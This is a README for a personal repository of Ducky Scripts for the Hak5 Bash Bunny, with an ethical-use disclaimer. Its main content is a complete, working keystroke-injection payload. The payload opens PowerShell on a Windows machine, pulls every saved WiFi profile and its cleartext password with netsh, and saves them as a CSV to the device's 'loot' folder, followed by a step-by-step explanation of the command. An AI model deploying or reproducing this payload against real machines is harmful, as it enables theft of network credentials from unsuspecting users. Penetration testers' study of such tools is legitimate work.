# Steven's Custom Ducky Script Repository

This repository contains **custom Ducky Scripts** designed for use with **Hak5's Bash Bunny**. These scripts are intended for **educational purposes, ethical hacking, penetration testing, and cybersecurity research**.



## ⚠ Disclaimer

**Legal & Ethical Use Notice**  
These scripts are provided **strictly for educational and research purposes only**. Unauthorized use of these scripts to access systems without permission is **illegal and punishable by law**. By using this repository, you **agree** to only use these scripts in **controlled environments** (e.g., on your own devices or with explicit permission). I, the author, **do not take responsibility** for any misuse of these scripts. Thank you!

## Bash Bunny Network Key Dumper to CSV (Windows) 
**Payload.txt handles overall attack logic, device modes, and script execution.**
```ducky
# set up payload
LED SETUP
GET SWITCH_POSITION
ATTACKMODE HID STORAGE

# run duckyscript file 'ducky-script.txt'
LED STAGE1
QUACK ${SWITCH_POSITION}/ducky-script.txt

# end payload
LED FINISH
```

**Ducky-script.txt contains keystroke injection commands (Ducky Script syntax).**
```ducky
# opens the run dialog and waits 500 milliseconds to ensure the run dialog is open
GUI r
DELAY 500

# launches powershell without loading a user profile and waits 500 milliseconds
STRING powershell -NoProfile 
ENTER
DELAY 500

# navigates to the Bash Bunny's USB storage assuming it's labeled BashBunny
STRING $u=gwmi Win32_Volume|?{$_.Label -eq'BashBunny'}|select name;cd $u.name
ENTER
DELAY 500

# navigates to the loot directory where extracted data will be stored and waits 500 milliseconds
STRING cd loot
ENTER
DELAY 500

# extract WiFi profiles and passwords and saves to a CSV file in loot
STRING (netsh wlan show profiles) | Select-String ":(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv -NoTypeInformation -Path ".\$env:UserName`_WiFiPasswords.csv"; exit
ENTER

```
**Explanation of the PowerShell command:**
```
1. `netsh wlan show profiles` – Lists all saved WiFi profiles.
2. `Select-String ":(.+)$"` – Extracts profile names using regex.
3. `netsh wlan show profile name="$name" key=clear` – Retrieves the password for each profile.
4. `Select-String "Key Content\W+\:(.+)$"` – Extracts the WiFi password using regex.
5. `[PSCustomObject]@{ PROFILE_NAME=$name; PASSWORD=$pass }` – Formats the data into objects.
6. `Export-Csv -NoTypeInformation -Path ".\$env:UserName`_WiFiPasswords.csv"` – Saves the extracted credentials as a CSV file.
7. `exit` – Closes PowerShell.
```



## 🔗 References

- [Hak5 Official Website](https://hak5.org/)
- [Bash Bunny Documentation](https://docs.hak5.org/bash-bunny/)

